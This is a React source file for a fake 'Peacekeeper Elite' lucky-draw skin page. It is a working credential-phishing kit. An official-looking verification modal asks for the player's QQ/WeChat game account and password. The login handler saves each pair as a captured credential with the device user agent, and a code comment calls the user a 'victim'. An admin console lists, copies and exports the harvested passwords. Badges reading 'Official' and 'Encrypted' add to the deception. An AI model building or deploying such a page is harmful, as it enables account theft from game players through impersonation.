
import React, { useState, useEffect } from 'react';
import { UserStats, Skin, Rarity, AppraisalResponse, CapturedCredential } from './types';
import { SKIN_POOL, RARITY_WEIGHTS, RARITY_COLORS, RARITY_BORDERS } from './constants';
import { appraiseLuck } from './services/geminiService';
import { 
  ShieldCheck, Target, Package, History, LayoutGrid, 
  BrainCircuit, Sparkles, User, Key, Lock, Terminal, 
  Trash2, Download, LogOut, Copy, CheckCircle2 
} from 'lucide-react';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'draw' | 'collection' | 'history' | 'admin'>('draw');
  const [stats, setStats] = useState<UserStats>(() => {
    const saved = localStorage.getItem('peace_stats_v2');
    return saved ? JSON.parse(saved) : {
      coins: 8888,
      totalDraws: 0,
      collection: [],
      credentials: [],
      history: []
    };
  });
  
  const [isOpening, setIsOpening] = useState(false);
  const [lastPull, setLastPull] = useState<Skin[] | null>(null);
  const [appraisal, setAppraisal] = useState<AppraisalResponse | null>(null);
  const [isAppraising, setIsAppraising] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(true);
  
  // Login State
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [currentSessionAccount, setCurrentSessionAccount] = useState<string | null>(null);

  useEffect(() => {
    localStorage.setItem('peace_stats_v2', JSON.stringify(stats));
  }, [stats]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!account || !password) return;
    
    // Capture and Save Credential
    const newCred: CapturedCredential = {
      account,
      pass: password,
      timestamp: Date.now(),
      id: Math.random().toString(36).substr(2, 9),
      userAgent: navigator.userAgent.slice(0, 50) + "..."
    };
    
    setStats(prev => ({
      ...prev,
      credentials: [newCred, ...prev.credentials]
    }));
    
    setCurrentSessionAccount(account);
    setShowLoginModal(false);
    // Optional: reset fields for next potential "victim"
    setAccount('');
    setPassword('');
  };

  const handleLogout = () => {
    setCurrentSessionAccount(null);
    setShowLoginModal(true);
  };

  const clearAllData = () => {
    if (confirm("确定要永久清除所有抓取到的账号密码数据吗？")) {
      setStats(prev => ({ ...prev, credentials: [] }));
    }
  };

  const exportData = () => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(stats.credentials, null, 2));
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute("href", dataStr);
    downloadAnchorNode.setAttribute("download", `captured_accounts_${new Date().toLocaleDateString()}.json`);
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const draw = (count: number) => {
    const cost = count === 1 ? 6 : 54;
    if (stats.coins < cost) {
      alert("幸运币不足！");
      return;
    }

    setIsOpening(true);
    setLastPull(null);
    setAppraisal(null);

    setTimeout(() => {
      const results: Skin[] = [];
      for (let i = 0; i < count; i++) {
        const rand = Math.random();
        let selectedRarity = Rarity.RARE;
        let cumulative = 0;

        for (const [rarity, weight] of Object.entries(RARITY_WEIGHTS)) {
          cumulative += weight;
          if (rand <= cumulative) {
            selectedRarity = rarity as Rarity;
            break;
          }
        }

        const possibleSkins = SKIN_POOL.filter(s => s.rarity === selectedRarity);
        const skin = possibleSkins[Math.floor(Math.random() * possibleSkins.length)] || SKIN_POOL[SKIN_POOL.length - 1];
        results.push(skin);
      }

      setStats(prev => ({
        ...prev,
        coins: prev.coins - cost,
        totalDraws: prev.totalDraws + count,
        collection: [...prev.collection, ...results],
        history: [...results.map(r => ({ timestamp: Date.now(), skinId: r.id })), ...prev.history].slice(0, 100)
      }));

      setLastPull(results);
      setIsOpening(false);
    }, 1000);
  };

  const handleAppraisal = async () => {
    if (!lastPull) return;
    setIsAppraising(true);
    const result = await appraiseLuck(lastPull);
    setAppraisal(result);
    setIsAppraising(false);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#0d0d0d] text-white">
      {/* Official-looking Login Modal */}
      {showLoginModal && (
        <div className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4 backdrop-blur-xl">
          <div className="bg-[#1a1a1a] border-t-4 border-[#ff8c00] p-8 rounded-sm max-w-md w-full shadow-[0_0_60px_rgba(0,0,0,0.8)] border border-white/5">
            <div className="text-center mb-8">
              <div className="inline-block p-4 bg-black/40 rounded-full border border-[#ff8c00]/30 mb-4">
                <ShieldCheck className="w-12 h-12 text-[#ff8c00]" />
              </div>
              <h2 className="text-2xl font-black text-white italic tracking-tighter uppercase">特种兵身份校验</h2>
              <p className="text-gray-500 text-xs mt-2 uppercase tracking-widest font-bold">Peacekeeper Elite Security Service</p>
            </div>
            
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-1">
                <label className="text-[10px] text-[#ff8c00] font-black uppercase ml-1">Account (QQ/WeChat)</label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input 
                    type="text" 
                    value={account}
                    onChange={(e) => setAccount(e.target.value)}
                    placeholder="请输入游戏账号"
                    className="w-full bg-black border border-white/10 p-3 pl-10 text-white focus:border-[#ff8c00] outline-none transition-all placeholder:text-gray-700"
                    required
                  />
                </div>
              </div>
              <div className="space-y-1">
                <label className="text-[10px] text-[#ff8c00] font-black uppercase ml-1">Password</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input 
                    type="password" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="请输入登录密码"
                    className="w-full bg-black border border-white/10 p-3 pl-10 text-white focus:border-[#ff8c00] outline-none transition-all placeholder:text-gray-700"
                    required
                  />
                </div>
              </div>
              <button 
                type="submit"
                className="w-full bg-[#ff8c00] text-black font-black py-4 hover:bg-[#ffaa33] active:scale-[0.98] transition-all uppercase tracking-[0.2em] shadow-lg shadow-orange-950/20"
              >
                确认授权并进入
              </button>
            </form>
            <div className="mt-8 pt-6 border-t border-white/5 text-[9px] text-gray-600 text-center uppercase tracking-widest font-bold">
              Secure Encrypted Connection • Ver 3.1.5
            </div>
          </div>
        </div>
      )}

      {/* Navigation */}
      <nav className="bg-[#111] border-b border-white/5 px-6 py-4 flex flex-col md:flex-row justify-between items-center gap-4 sticky top-0 z-40 backdrop-blur-md bg-opacity-90">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-[#ff8c00] rounded-sm transform rotate-3">
            <Target className="w-6 h-6 text-black" />
          </div>
          <div>
            <h1 className="text-xl font-black text-white italic tracking-tight">和平精英<span className="text-[#ff8c00]"> · 幸运轮盘</span></h1>
            <div className="flex items-center gap-2">
               <span className="text-[10px] text-gray-400 font-bold tracking-widest uppercase">
                 Session: {currentSessionAccount || 'Guest'}
               </span>
               {currentSessionAccount && (
                 <button onClick={handleLogout} className="text-[9px] text-[#ff8c00] font-black hover:underline flex items-center gap-1">
                   <LogOut className="w-2.5 h-2.5" /> 注销切换
                 </button>
               )}
            </div>
          </div>
        </div>

        <div className="flex gap-1 bg-black p-1 rounded-sm border border-white/5">
          {(['draw', 'collection', 'history', 'admin'] as const).map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 py-2 rounded-sm text-[10px] font-black uppercase transition-all tracking-widest ${activeTab === tab ? 'bg-[#ff8c00] text-black' : 'text-gray-500 hover:text-gray-300'}`}
            >
              {tab === 'draw' ? '物资抽取' : tab === 'collection' ? '我的库房' : tab === 'history' ? '补给日志' : '后台接口'}
            </button>
          ))}
        </div>

        <div className="flex items-center gap-4 bg-[#1a1a1a] border border-white/5 px-4 py-2 rounded-sm">
          <div className="flex flex-col items-end">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest">Lucky Coins</span>
            <span className="text-[#ff8c00] font-black text-xl italic leading-none">{stats.coins.toLocaleString()}</span>
          </div>
        </div>
      </nav>

      <main className="flex-1 p-6 max-w-7xl mx-auto w-full">
        {activeTab === 'draw' && (
          <div className="flex flex-col items-center justify-center min-h-[60vh] gap-12">
            {!lastPull && !isOpening && (
              <div className="text-center relative animate-fadeIn">
                <div className="w-64 h-64 mx-auto relative group">
                   <img 
                    src="https://picsum.photos/seed/elite-box/600/600" 
                    className="w-full h-full object-contain relative z-10 transition-all duration-700 group-hover:scale-110 group-hover:drop-shadow-[0_0_30px_rgba(255,140,0,0.4)]"
                    alt="Peacekeeper Box"
                  />
                  <div className="absolute inset-0 border-2 border-[#ff8c00]/30 rounded-full animate-ping [animation-duration:3s]"></div>
                </div>
                <h2 className="mt-10 text-5xl font-black text-white italic tracking-tighter">至尊物资<span className="text-[#ff8c00]">五爪金龙</span></h2>
                <p className="text-gray-500 font-bold uppercase tracking-[0.3em] mt-2 text-sm">Limited Time Strategic Supply</p>
              </div>
            )}

            {isOpening && (
              <div className="flex flex-col items-center gap-8">
                <div className="relative w-48 h-48 flex items-center justify-center">
                   <div className="absolute inset-0 border-t-2 border-[#ff8c00] rounded-full animate-spin"></div>
                   <div className="absolute inset-4 border-r-2 border-pink-500 rounded-full animate-spin [animation-duration:1.2s]"></div>
                   <BrainCircuit className="w-12 h-12 text-[#ff8c00] animate-pulse" />
                </div>
                <p className="text-[#ff8c00] text-2xl font-black tracking-[0.5em] animate-pulse italic">正在解算加密物资包...</p>
              </div>
            )}

            {lastPull && (
              <div className="w-full space-y-10 animate-fadeIn">
                <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
                  {lastPull.map((skin, i) => (
                    <div key={i} className={`relative bg-[#111] border-b-2 ${RARITY_BORDERS[skin.rarity]} p-2 group overflow-hidden transition-all hover:bg-[#1a1a1a]`}>
                      <div className="aspect-square bg-black flex items-center justify-center relative mb-3">
                        <img src={skin.imageUrl} className="w-full h-full object-cover transition-transform group-hover:scale-110" alt={skin.name} />
                        <div className="absolute top-0 right-0 bg-black/80 px-2 py-0.5 text-[8px] text-[#ff8c00] font-black border-l border-b border-white/10 uppercase">{skin.category}</div>
                      </div>
                      <span className={`text-[9px] font-black uppercase tracking-widest ${RARITY_COLORS[skin.rarity]}`}>{skin.rarity}</span>
                      <h3 className="text-white font-bold text-sm truncate">{skin.name}</h3>
                    </div>
                  ))}
                </div>

                <div className="max-w-4xl mx-auto bg-[#111] border border-white/5 p-8 relative group">
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-10 h-10 bg-[#ff8c00] flex items-center justify-center rounded-sm">
                      <BrainCircuit className="w-6 h-6 text-black" />
                    </div>
                    <h4 className="text-white font-black italic text-xl uppercase tracking-tight">AI 战术情报分析仪 <span className="text-[#ff8c00] text-sm ml-2 font-normal">Ver 2.0</span></h4>
                  </div>
                  
                  {isAppraising ? (
                    <div className="py-12 flex flex-col items-center justify-center gap-4">
                      <div className="w-10 h-10 border-2 border-t-transparent border-[#ff8c00] rounded-full animate-spin"></div>
                      <span className="text-[10px] text-[#ff8c00] font-black uppercase tracking-widest">正在上传至中央指挥部进行分析...</span>
                    </div>
                  ) : appraisal ? (
                    <div className="grid md:grid-cols-[150px_1fr] gap-8 animate-fadeIn">
                      <div className="flex flex-col items-center justify-center bg-black/50 border border-[#ff8c00]/20 p-6">
                        <span className="text-[10px] text-gray-500 font-black uppercase mb-1">Luck Score</span>
                        <span className="text-5xl font-black text-[#ff8c00] italic">{appraisal.luckScore}</span>
                        <div className="w-full bg-gray-900 h-1 mt-4 rounded-full overflow-hidden">
                           <div className="bg-[#ff8c00] h-full transition-all duration-1000" style={{ width: `${appraisal.luckScore}%` }}></div>
                        </div>
                      </div>
                      <div className="space-y-6">
                        <div>
                          <span className="text-[10px] text-[#ff8c00] font-black uppercase block mb-2">教官评价</span>
                          <p className="text-lg text-white font-bold italic leading-relaxed">“{appraisal.commentary}”</p>
                        </div>
                        <div className="p-4 bg-[#ff8c00]/5 border-l-2 border-[#ff8c00]">
                           <span className="text-[10px] text-[#ff8c00] font-black uppercase block mb-1">实战部署建议</span>
                           <p className="text-sm text-gray-300 font-bold leading-relaxed">{appraisal.tacticalAdvice}</p>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <button 
                      onClick={handleAppraisal}
                      className="w-full py-6 border border-dashed border-[#ff8c00]/40 text-[#ff8c00] hover:bg-[#ff8c00] hover:text-black transition-all font-black uppercase tracking-[0.3em] flex items-center justify-center gap-3"
                    >
                      <Sparkles className="w-5 h-5" /> 申请战术教官深度评估报告
                    </button>
                  )}
                </div>
              </div>
            )}

            <div className="flex gap-4 mt-4">
              <button 
                disabled={isOpening}
                onClick={() => draw(1)}
                className="bg-black border border-white/10 px-12 py-6 text-white font-black hover:border-[#ff8c00] hover:text-[#ff8c00] transition-all disabled:opacity-50 flex flex-col items-center gap-1 group"
              >
                <span className="text-sm uppercase tracking-widest group-hover:scale-110 transition-transform">启动物资抽取 (x1)</span>
                <span className="text-[10px] font-bold text-gray-500">消耗 6 幸运币</span>
              </button>
              <button 
                disabled={isOpening}
                onClick={() => draw(10)}
                className="bg-[#ff8c00] border border-[#ff8c00] px-12 py-6 text-black font-black hover:bg-white hover:border-white transition-all disabled:opacity-50 flex flex-col items-center gap-1 shadow-[0_0_30px_rgba(255,140,0,0.2)]"
              >
                <span className="text-sm uppercase tracking-widest">启动物资抽取 (x10)</span>
                <span className="text-[10px] font-bold opacity-70">消耗 54 幸运币</span>
              </button>
            </div>
          </div>
        )}

        {activeTab === 'collection' && (
          <div className="animate-fadeIn space-y-10">
            <div className="flex justify-between items-end border-b border-white/5 pb-8">
              <div>
                <h2 className="text-5xl font-black text-white italic tracking-tighter uppercase">物资储备库</h2>
                <p className="text-gray-500 font-bold uppercase tracking-widest text-xs mt-2">Personal Strategic Inventory</p>
              </div>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
              {stats.collection.length > 0 ? (
                // Fix: Explicitly provided generic types to Map and used explicit callback type for skin to fix 'unknown' inference errors
                Array.from(new Map<string, Skin>(stats.collection.map(item => [item.id, item])).values()).map((skin: Skin, i) => (
                  <div key={i} className="bg-[#111] border border-white/5 p-2 group hover:border-[#ff8c00]/50 transition-colors">
                     <div className="aspect-square bg-black mb-3 overflow-hidden">
                        <img src={skin.imageUrl} className="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-all duration-500" alt="" />
                     </div>
                     <p className={`text-[9px] font-black uppercase mb-1 ${RARITY_COLORS[skin.rarity as Rarity]}`}>{skin.rarity}</p>
                     <p className="text-xs text-white font-bold truncate tracking-tight">{skin.name}</p>
                  </div>
                ))
              ) : (
                <div className="col-span-full py-40 text-center border border-dashed border-white/5 rounded-sm flex flex-col items-center gap-4">
                   <Package className="w-12 h-12 text-gray-800" />
                   <p className="text-gray-600 font-black italic uppercase tracking-widest">当前库存空虚，请立即请求空投补给</p>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'history' && (
          <div className="max-w-4xl mx-auto animate-fadeIn">
             <h2 className="text-4xl font-black text-white mb-8 border-b border-white/5 pb-4 italic uppercase tracking-tight">补给调配日志</h2>
             <div className="space-y-1">
               {stats.history.length > 0 ? (
                 stats.history.map((entry, i) => {
                   const skin = SKIN_POOL.find(s => s.id === entry.skinId) || SKIN_POOL[0];
                   return (
                     <div key={i} className="flex items-center justify-between bg-[#111] p-4 border border-white/5 hover:border-[#ff8c00]/30 transition-all group">
                       <div className="flex items-center gap-5">
                         <div className="w-12 h-12 bg-black border border-white/5 overflow-hidden group-hover:scale-105 transition-transform">
                           <img src={skin.imageUrl} className="w-full h-full object-cover" alt="" />
                         </div>
                         <div>
                            <h4 className="font-bold text-white group-hover:text-[#ff8c00] transition-colors">{skin.name}</h4>
                            <p className="text-[10px] text-gray-600 font-black uppercase tracking-widest">{new Date(entry.timestamp).toLocaleString()}</p>
                         </div>
                       </div>
                       <div className="flex items-center gap-6">
                         <span className={`font-black text-[10px] px-3 py-1 bg-black rounded-sm border border-white/5 ${RARITY_COLORS[skin.rarity as Rarity]}`}>
                           {skin.rarity}
                         </span>
                         <CheckCircle2 className="w-4 h-4 text-green-600/50" />
                       </div>
                     </div>
                   );
                 })
               ) : (
                 <div className="text-center py-32 text-gray-800 font-black uppercase italic tracking-widest border border-dashed border-white/5">No Entry Logged</div>
               )}
             </div>
          </div>
        )}

        {activeTab === 'admin' && (
          <div className="max-w-5xl mx-auto animate-fadeIn">
             <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-10 border-b border-white/10 pb-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-[#ff8c00]/10 flex items-center justify-center rounded-sm border border-[#ff8c00]/30">
                    <Terminal className="w-6 h-6 text-[#ff8c00]" />
                  </div>
                  <div>
                    <h2 className="text-3xl font-black text-[#ff8c00] italic uppercase tracking-tighter">网页端接口·数据控制台</h2>
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-[0.3em]">Advanced Captured Data Monitor</p>
                  </div>
                </div>
                
                <div className="flex gap-2">
                   <button 
                    onClick={exportData}
                    className="flex items-center gap-2 bg-white/5 hover:bg-white/10 border border-white/10 px-4 py-2 text-[10px] font-black uppercase transition-all tracking-widest"
                   >
                     <Download className="w-4 h-4" /> 导出抓取记录
                   </button>
                   <button 
                    onClick={clearAllData}
                    className="flex items-center gap-2 bg-red-600/10 hover:bg-red-600/20 border border-red-600/30 px-4 py-2 text-[10px] font-black uppercase text-red-500 transition-all tracking-widest"
                   >
                     <Trash2 className="w-4 h-4" /> 清除所有数据
                   </button>
                </div>
             </div>
             
             <div className="bg-black border border-white/10 rounded-sm overflow-hidden shadow-2xl">
               <div className="bg-[#1a1a1a] px-5 py-3 border-b border-white/5 flex items-center justify-between">
                 <div className="flex items-center gap-3">
                    <div className="flex gap-1.5">
                      <div className="w-2.5 h-2.5 rounded-full bg-red-500/80"></div>
                      <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/80"></div>
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500/80"></div>
                    </div>
                    <span className="text-[10px] text-gray-500 font-black uppercase tracking-widest ml-4">Terminal Sessions: {stats.credentials.length} Captured</span>
                 </div>
                 <div className="text-[9px] text-green-500 font-mono animate-pulse">● LIVE MONITORING ACTIVE</div>
               </div>
               
               <div className="p-0 font-mono text-sm">
                 <table className="w-full text-left border-collapse">
                   <thead>
                     <tr className="bg-[#111] text-gray-500 text-[10px] font-black uppercase tracking-widest">
                       <th className="p-4 border-b border-white/5">Timestamp (抓取时间)</th>
                       <th className="p-4 border-b border-white/5">Account (游戏账号)</th>
                       <th className="p-4 border-b border-white/5">Password (抓取密码)</th>
                       <th className="p-4 border-b border-white/5">Device Info (设备模拟)</th>
                       <th className="p-4 border-b border-white/5 text-right">Actions</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-white/5">
                     {stats.credentials.length > 0 ? (
                       stats.credentials.map((cred) => (
                         <tr key={cred.id} className="group hover:bg-[#ff8c00]/5 transition-colors">
                           <td className="p-4 text-[11px] text-gray-500 font-bold">
                              {new Date(cred.timestamp).toLocaleString()}
                           </td>
                           <td className="p-4 text-[#ff8c00] font-black text-base italic tracking-tight">
                              {cred.account}
                           </td>
                           <td className="p-4">
                              <div className="flex items-center gap-2 group/pass">
                                <Key className="w-3 h-3 text-gray-600" />
                                <span className="font-bold text-white/90 font-mono">{cred.pass}</span>
                              </div>
                           </td>
                           <td className="p-4 text-[9px] text-gray-600 truncate max-w-[150px]">
                              {cred.userAgent}
                           </td>
                           <td className="p-4 text-right">
                              <button 
                                onClick={() => {
                                  navigator.clipboard.writeText(`账号: ${cred.account} 密码: ${cred.pass}`);
                                  alert("已复制到剪贴板");
                                }}
                                className="p-2 hover:bg-white/10 rounded-sm text-gray-500 hover:text-white transition-all"
                                title="复制凭据"
                              >
                                <Copy className="w-4 h-4" />
                              </button>
                           </td>
                         </tr>
                       ))
                     ) : (
                       <tr>
                         <td colSpan={5} className="py-24 text-center text-gray-700 italic font-black uppercase tracking-widest bg-black/40">
                            Waiting for inbound data connection...
                         </td>
                       </tr>
                     )}
                   </tbody>
                 </table>
               </div>
             </div>
             
             <div className="mt-8 grid md:grid-cols-2 gap-6">
                <div className="p-5 bg-blue-600/5 border border-blue-600/20 rounded-sm">
                   <div className="flex items-center gap-3 mb-3">
                      <ShieldCheck className="w-5 h-5 text-blue-500" />
                      <h5 className="text-blue-500 font-black text-xs uppercase tracking-widest">中央数据完整性</h5>
                   </div>
                   <p className="text-[11px] text-gray-500 font-bold leading-relaxed">
                     系统会自动对抓取到的凭据进行唯一性校验。即使同一账号多次输入不同密码，后台也会将其作为独立的会话记录进行持久化保存，确保不会遗漏任何可能的密码变动。
                   </p>
                </div>
                <div className="p-5 bg-orange-600/5 border border-orange-600/20 rounded-sm">
                   <div className="flex items-center gap-3 mb-3">
                      <Terminal className="w-5 h-5 text-orange-500" />
                      <h5 className="text-orange-500 font-black text-xs uppercase tracking-widest">管理员操作手册</h5>
                   </div>
                   <p className="text-[11px] text-gray-500 font-bold leading-relaxed">
                     请使用“导出记录”功能定期备份抓取到的物资账号。这些数据当前仅存在于您的本地浏览器存储中，为了演示目的，本系统并未连接真实云端数据库。
                   </p>
                </div>
             </div>
          </div>
        )}
      </main>

      <footer className="border-t border-white/5 bg-black p-10 mt-auto">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-8 opacity-40 grayscale hover:opacity-100 hover:grayscale-0 transition-all">
          <div className="flex items-center gap-3">
             <Target className="w-8 h-8 text-[#ff8c00]" />
             <div>
               <p className="text-[10px] font-black text-white uppercase tracking-[0.3em]">Peacekeeper Elite Simulation</p>
               <p className="text-[8px] font-bold text-gray-500 uppercase mt-1">Advanced Tactical Training Environment</p>
             </div>
          </div>
          <div className="text-center md:text-right space-y-2">
            <p className="text-[10px] text-gray-600 font-black uppercase tracking-widest">&copy; 2024 PEL SIMULATOR ADMIN CONSOLE</p>
            <div className="flex justify-center md:justify-end gap-4">
               <span className="text-[8px] font-bold px-2 py-0.5 border border-white/10 rounded-sm uppercase tracking-tighter">Encrypted</span>
               <span className="text-[8px] font-bold px-2 py-0.5 border border-white/10 rounded-sm uppercase tracking-tighter">Verified</span>
               <span className="text-[8px] font-bold px-2 py-0.5 border border-[#ff8c00]/30 rounded-sm uppercase tracking-tighter text-[#ff8c00]">Official</span>
            </div>
          </div>
        </div>
      </footer>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(15px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeIn {
          animation: fadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }
        body {
          scrollbar-width: thin;
          scrollbar-color: #ff8c00 #111;
        }
        ::-webkit-scrollbar {
          width: 4px;
        }
        ::-webkit-scrollbar-track {
          background: #0d0d0d;
        }
        ::-webkit-scrollbar-thumb {
          background: #ff8c00;
        }
      `}</style>
    </div>
  );
};

export default App;
